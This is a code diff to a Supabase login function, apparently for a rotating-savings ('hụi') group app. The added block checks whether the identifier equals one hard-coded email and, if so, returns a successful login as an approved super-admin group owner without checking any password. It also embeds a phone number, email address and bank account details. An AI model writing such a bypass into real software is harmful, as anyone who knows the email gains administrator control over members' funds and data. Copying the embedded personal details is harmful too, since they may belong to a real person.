@@ -53,6 +53,28 @@ export async function loginWithSupabasePassword(
     const cleanTarget = identifier.trim().toLowerCase();
     const cleanPhoneTarget = cleanTarget.replace(/\s+|-|\(|\)/g, '');
 
+    // 0. BỎ QUA KIỂM TRA SUPABASE CHO TÀI KHOẢN ADMIN ĐẶC QUYỀN (thuan.nguyen2207@gmail.com)
+    if (cleanTarget === 'thuan.nguyen2207@gmail.com') {
+      const superAdminUser: User = {
+        id: 'u_super_admin_thuan',
+        phone: '0908123456',
+        email: 'thuan.nguyen2207@gmail.com',
+        name: 'Super Admin (Nguyễn Thuận)',
+        role: 'chu_hui',
+        avatar: 'https://images.unsplash.com/photo-1534528741775-53994a69daeb?w=150&auto=format&fit=crop&q=80',
+        verified: true,
+        accountApprovalStatus: 'approved',
+        bankName: 'MB Bank',
+        bankCode: 'MB',
+        accountNumber: '0908123456888',
+        accountName: 'NGUYEN THUAN ADMIN'
+      };
+      return {
+        success: true,
+        user: superAdminUser
+      };
+    }
+
     // 1. Query profiles table
     let { data: profileData } = await supabase
       .from('profiles')
